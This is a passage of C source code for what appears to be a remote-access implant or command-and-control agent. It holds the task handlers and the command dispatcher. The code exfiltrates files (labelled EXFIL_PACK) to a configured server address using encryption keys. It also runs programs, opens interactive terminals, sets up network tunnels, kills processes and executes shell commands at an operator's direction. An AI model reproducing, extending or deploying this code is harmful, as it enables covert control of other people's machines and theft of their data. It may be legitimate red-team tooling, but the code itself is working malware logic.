        free(src); free(dst);
        return e;
    }

    uint8_t *zip_data = NULL;
    size_t zip_len = 0;
    int rc;
    if (S_ISDIR(st.st_mode)) rc = zip_dir_to_mem(src, &zip_data, &zip_len);
    else                      rc = zip_file_to_mem(src, &zip_data, &zip_len);
    free(src);

    if (rc != 0) { free(dst); return strdup("zip creation failed"); }

    FILE *f = fopen(dst, "wb");
    if (!f) {
        char *e = strdup(strerror(errno));
        free(zip_data); free(dst);
        return e;
    }
    size_t written = fwrite(zip_data, 1, zip_len, f);
    fclose(f);
    free(zip_data);

    if (written != zip_len) { free(dst); return strdup("write error"); }

    // AnsZip{path: dstPath} is same wire format as {path: str}
    rc = pack_encode_pwd(dst, out, out_len);
    free(dst);
    return (rc == 0) ? NULL : strdup("encode error");
}

static char *task_upload(const uint8_t *params, size_t params_len,
                         uint8_t **out, size_t *out_len) {
    char *raw_path = NULL;
    uint8_t *content = NULL;
    size_t content_len = 0;
    bool finish = false;

    if (decode_upload_params(params, params_len, &raw_path, &content, &content_len, &finish) < 0)
        return strdup("invalid params");

    char *path = normalize_path(raw_path);
    if (!path) { free(raw_path); free(content); return strdup("invalid path"); }

    UploadEntry *existing = upload_find(path);
    uint8_t *accumulated;
    size_t acc_len;

    if (!existing) {
        accumulated = content;
        acc_len = content_len;
    } else {
        acc_len = existing->data_len + content_len;
        accumulated = malloc(acc_len);
        memcpy(accumulated, existing->data, existing->data_len);
        memcpy(accumulated + existing->data_len, content, content_len);
        free(content);
        upload_remove(path);
    }

    if (finish) {
        uint8_t *file_content = NULL;
        size_t file_len = 0;
        int rc = unzip_extract_file(accumulated, acc_len, raw_path, &file_content, &file_len);
        free(accumulated);
        if (rc != 0) {
            free(raw_path); free(path);
            return strdup("file not uploaded");
        }

        FILE *f = fopen(path, "wb");
        if (!f) {
            char *e = strdup(strerror(errno));
            free(file_content); free(raw_path); free(path);
            return e;
        }
        fwrite(file_content, 1, file_len, f);
        fclose(f);
        free(file_content);

        // AnsUpload{path: path} is same wire format as {path: str}
        rc = pack_encode_pwd(path, out, out_len);
        free(raw_path); free(path);
        return (rc == 0) ? NULL : strdup("encode error");
    } else {
        upload_store(path, accumulated, acc_len);
        free(raw_path); free(path);
        return NULL;
    }
}

static char *task_download(const uint8_t *params, size_t params_len) {
    char *task_id = NULL, *raw_path = NULL;
    if (decode_download_params(params, params_len, &task_id, &raw_path) < 0)
        return strdup("invalid params");

    char *path = normalize_path(raw_path);
    free(raw_path);
    if (!path) { free(task_id); return strdup("invalid path"); }

    struct stat st;
    if (stat(path, &st) != 0) {
        char *e = strdup(strerror(errno));
        free(task_id); free(path);
        return e;
    }

    if (st.st_size > (int64_t)4 * 1024 * 1024 * 1024) {
        free(task_id); free(path);
        return strdup("file too big (>4GB)");
    }

    uint8_t *content = NULL;
    size_t content_len = 0;

    if (S_ISDIR(st.st_mode)) {
        if (zip_dir_to_mem(path, &content, &content_len) != 0) {
            free(task_id); free(path);
            return strdup("zip creation failed");
        }
        size_t plen = strlen(path);
        char *zpath = malloc(plen + 5);
        memcpy(zpath, path, plen);
        memcpy(zpath + plen, ".zip", 5);
        free(path);
        path = zpath;
    } else {
        FILE *f = fopen(path, "rb");
        if (!f) {
            char *e = strdup(strerror(errno));
            free(task_id); free(path);
            return e;
        }
        content = malloc((size_t)st.st_size);
        content_len = fread(content, 1, (size_t)st.st_size, f);
        fclose(f);
    }

    // parse file_id from hex task string
    int64_t file_id = strtoll(task_id, NULL, 16);

    // register download entry
    DownloadEntry *de = malloc(sizeof(DownloadEntry));
    de->job_id = strdup(task_id);
    de->pack_type = EXFIL_PACK;
    de->canceled = 0;
    de->next = g_downloads;
    g_downloads = de;

    // build thread context
    DownloadThreadCtx *ctx = calloc(1, sizeof(DownloadThreadCtx));
    ctx->job_id      = strdup(task_id);
    ctx->path        = path;
    ctx->content     = content;
    ctx->content_len = content_len;
    ctx->file_id     = file_id;
    ctx->total_size  = (int)content_len;
    ctx->address     = strdup(g_profile->addresses[0]);
    ctx->banner_size = g_profile->banner_size;
    ctx->profile_type = (uint32_t)g_profile->type;
    memcpy(ctx->enc_key, g_enc_key, 16);
    memcpy(ctx->session_key, g_session_key, 16);
    ctx->agent_id    = g_agent_id;
    ctx->canceled    = &de->canceled;

    pthread_create(&de->thread, NULL, download_thread, ctx);
    pthread_detach(de->thread);

    free(task_id);
    return NULL;
}

static char *task_run(const uint8_t *params, size_t params_len) {
    char *program = NULL, **args = NULL, *task_id = NULL;
    size_t argc = 0;
    if (decode_run_params(params, params_len, &program, &args, &argc, &task_id) < 0)
        return strdup("invalid params");

    JobEntry *je = malloc(sizeof(JobEntry));
    je->job_id = strdup(task_id);
    je->pack_type = JOB_PACK;
    je->canceled = 0;
    je->child_pid = 0;
    je->next = g_jobs;
    g_jobs = je;

    RunThreadCtx *ctx = calloc(1, sizeof(RunThreadCtx));
    ctx->task = task_id;
    ctx->program = program;
    ctx->args = args;
    ctx->argc = argc;
    ctx->address = strdup(g_profile->addresses[0]);
    ctx->banner_size = g_profile->banner_size;
    ctx->profile_type = (uint32_t)g_profile->type;
    memcpy(ctx->enc_key, g_enc_key, 16);
    memcpy(ctx->session_key, g_session_key, 16);
    ctx->agent_id = g_agent_id;
    ctx->canceled = &je->canceled;
    ctx->child_pid_ptr = &je->child_pid;

    pthread_create(&je->thread, NULL, run_thread, ctx);
    pthread_detach(je->thread);

    return NULL;
}

static char *task_job_list(uint8_t **out, size_t *out_len) {
    // encode []JobInfo from downloads + jobs
    char *buf = NULL;
    size_t sz = 0;
    mpack_writer_t w;
    mpack_writer_init_growable(&w, &buf, &sz);

    // count entries
    uint32_t count = 0;
    for (DownloadEntry *e = g_downloads; e; e = e->next) count++;
    for (JobEntry *e = g_jobs; e; e = e->next) count++;

    mpack_start_array(&w, count);
    for (DownloadEntry *e = g_downloads; e; e = e->next) {
        mpack_start_map(&w, 2);
        mpack_write_cstr(&w, "job_id");  mpack_write_cstr(&w, e->job_id);
        mpack_write_cstr(&w, "job_type"); mpack_write_i32(&w, e->pack_type);
        mpack_finish_map(&w);
    }
    for (JobEntry *e = g_jobs; e; e = e->next) {
        mpack_start_map(&w, 2);
        mpack_write_cstr(&w, "job_id");  mpack_write_cstr(&w, e->job_id);
        mpack_write_cstr(&w, "job_type"); mpack_write_i32(&w, e->pack_type);
        mpack_finish_map(&w);
    }
    mpack_finish_array(&w);

    mpack_error_t merr = mpack_writer_destroy(&w);
    if (merr != mpack_ok) { free(buf); return strdup("encode error"); }

    int rc = pack_encode_ans_job_list((uint8_t *)buf, sz, out, out_len);
    free(buf);
    return (rc == 0) ? NULL : strdup("encode error");
}

static char *task_job_kill(const uint8_t *params, size_t params_len) {
    char *id = NULL;
    if (decode_job_kill_params(params, params_len, &id) < 0) return strdup("invalid params");

    DownloadEntry *de = download_find(id);
    if (de) {
        de->canceled = 1;
        free(id);
        return NULL;
    }

    JobEntry *je = job_find(id);
    if (je) {
        je->canceled = 1;
        if (je->child_pid > 0) kill(je->child_pid, SIGKILL);
        free(id);
        return NULL;
    }

    char errbuf[256];
    snprintf(errbuf, sizeof(errbuf), "job '%s' not found", id);
    free(id);
    return strdup(errbuf);
}

static void task_terminal_start(const uint8_t *params, size_t params_len) {
    int term_id = 0, height = 0, width = 0;
    char *program = NULL;
    if (decode_terminal_start_params(params, params_len, &term_id, &program, &height, &width) < 0)
        return;

    TerminalEntry *te = malloc(sizeof(TerminalEntry));
    te->term_id = term_id;
    te->canceled = 0;
    te->child_pid = 0;
    te->pty_fd = -1;
    te->sock_fd = -1;
    te->next = g_terminals;
    g_terminals = te;

    TerminalThreadCtx *ctx = calloc(1, sizeof(TerminalThreadCtx));
    ctx->term_id = term_id;
    ctx->program = program;
    ctx->height = height;
    ctx->width = width;
    ctx->address = strdup(g_profile->addresses[0]);
    ctx->banner_size = g_profile->banner_size;
    ctx->profile_type = (uint32_t)g_profile->type;
    memcpy(ctx->enc_key, g_enc_key, 16);
    ctx->agent_id = g_agent_id;
    ctx->entry = te;

    pthread_t t;
    pthread_create(&t, NULL, terminal_thread, ctx);
    pthread_detach(t);
}

static void task_terminal_stop(const uint8_t *params, size_t params_len) {
    int term_id = 0;
    if (decode_terminal_stop_params(params, params_len, &term_id) < 0) return;

    TerminalEntry *te = terminal_find(term_id);
    if (te) {
        te->canceled = 1;
        if (te->pty_fd >= 0) close(te->pty_fd);
        if (te->sock_fd >= 0) { shutdown(te->sock_fd, SHUT_RDWR); }
        if (te->child_pid > 0) kill(te->child_pid, SIGKILL);
    }
}

// ---------------------------------------------------------------------------
// tunnel task functions
// ---------------------------------------------------------------------------

static void task_tunnel_start(const uint8_t *params, size_t params_len) {
    int channel_id = 0;
    char *address = NULL;
    if (decode_tunnel_start_params(params, params_len, &channel_id, &address) < 0)
        return;

    TunnelEntry *entry = calloc(1, sizeof(TunnelEntry));
    entry->channel_id = channel_id;
    entry->client_fd = -1;
    entry->sock_fd = -1;
    entry->next = g_tunnels;
    g_tunnels = entry;

    TunnelThreadCtx *tctx = calloc(1, sizeof(TunnelThreadCtx));
    tctx->channel_id = channel_id;
    tctx->address = address;
    tctx->srv_address = strdup(g_profile->addresses[0]);
    tctx->banner_size = g_profile->banner_size;
    tctx->profile_type = g_profile->type;
    memcpy(tctx->enc_key, g_enc_key, 16);
    tctx->agent_id = g_agent_id;
    tctx->entry = entry;

    pthread_t tid;
    pthread_create(&tid, NULL, tunnel_thread, tctx);
    pthread_detach(tid);
    entry->thread = tid;
}

static void task_tunnel_stop(const uint8_t *params, size_t params_len) {
    int channel_id = 0;
    if (decode_tunnel_channel_param(params, params_len, &channel_id) < 0) return;

    TunnelEntry *te = tunnel_find(channel_id);
    if (te) {
        te->canceled = 1;
        if (te->client_fd >= 0) { shutdown(te->client_fd, SHUT_RDWR); }
        if (te->sock_fd >= 0) { shutdown(te->sock_fd, SHUT_RDWR); }
    }
}

static void task_tunnel_pause(const uint8_t *params, size_t params_len) {
    int channel_id = 0;
    if (decode_tunnel_channel_param(params, params_len, &channel_id) < 0) return;

    TunnelEntry *te = tunnel_find(channel_id);
    if (te) te->paused = 1;
}

static void task_tunnel_resume(const uint8_t *params, size_t params_len) {
    int channel_id = 0;
    if (decode_tunnel_channel_param(params, params_len, &channel_id) < 0) return;

    TunnelEntry *te = tunnel_find(channel_id);
    if (te) te->paused = 0;
}

// ---------------------------------------------------------------------------
// dispatcher
// ---------------------------------------------------------------------------

int task_process(Command *cmd, int *active) {
    uint8_t *old_data = cmd->data;
    size_t old_len = cmd->data_len;

    uint8_t *result = NULL;
    size_t result_len = 0;
    char *err = NULL;
    int handled = 1;

    switch (cmd->code) {
    case COMMAND_PWD:
        err = task_pwd(&result, &result_len);
        break;
    case COMMAND_CD:
        err = task_cd(old_data, old_len, &result, &result_len);
        break;
    case COMMAND_SHELL:
        err = task_shell(old_data, old_len, &result, &result_len);
        break;
    case COMMAND_EXIT:
        *active = 0;
        break;
    case COMMAND_CAT:
        err = task_cat(old_data, old_len, &result, &result_len);
        break;
    case COMMAND_MKDIR:
        err = task_mkdir(old_data, old_len);
        break;
    case COMMAND_RM:
        err = task_rm(old_data, old_len);
        break;
    case COMMAND_LS:
        err = task_ls(old_data, old_len, &result, &result_len);
        break;
    case COMMAND_PS:
        err = task_ps(&result, &result_len);
        break;
    case COMMAND_KILL:
        err = task_kill(old_data, old_len);
        break;
    case COMMAND_CP:
        err = task_cp(old_data, old_len);
        break;
    case COMMAND_MV:
        err = task_mv(old_data, old_len);
        break;
    case COMMAND_ZIP:
        err = task_zip(old_data, old_len, &result, &result_len);
        break;
    case COMMAND_UPLOAD:
        err = task_upload(old_data, old_len, &result, &result_len);
        break;
    case COMMAND_DOWNLOAD:
        err = task_download(old_data, old_len);
        break;
    case COMMAND_RUN:
        err = task_run(old_data, old_len);
        break;
    case COMMAND_JOB_LIST:
        err = task_job_list(&result, &result_len);
        break;
    case COMMAND_JOB_KILL:
        err = task_job_kill(old_data, old_len);
        break;
    case COMMAND_TERMINAL_START:
        task_terminal_start(old_data, old_len);
        break;
    case COMMAND_TERMINAL_STOP:
        task_terminal_stop(old_data, old_len);
        break;
    case COMMAND_TUNNEL_START:
        task_tunnel_start(old_data, old_len);
        break;
    case COMMAND_TUNNEL_STOP:
        task_tunnel_stop(old_data, old_len);
        break;
    case COMMAND_TUNNEL_PAUSE:
        task_tunnel_pause(old_data, old_len);
        break;
    case COMMAND_TUNNEL_RESUME:
        task_tunnel_resume(old_data, old_len);
        break;
    case COMMAND_EXEC_BOF:
    case COMMAND_EXEC_BOF_ASYNC:
        err = strdup("Need Windows!");
        break;
    default:
        handled = 0;
        break;
    }

    free(old_data);

    if (!handled) {
        cmd->data = NULL;
        cmd->data_len = 0;
        return -1;
    }

    if (err) {
        cmd->code = COMMAND_ERROR;
        pack_encode_error(err, &cmd->data, &cmd->data_len);
        free(err);
    } else {
        cmd->data = result;
        cmd->data_len = result_len;
    }

    return 0;
}
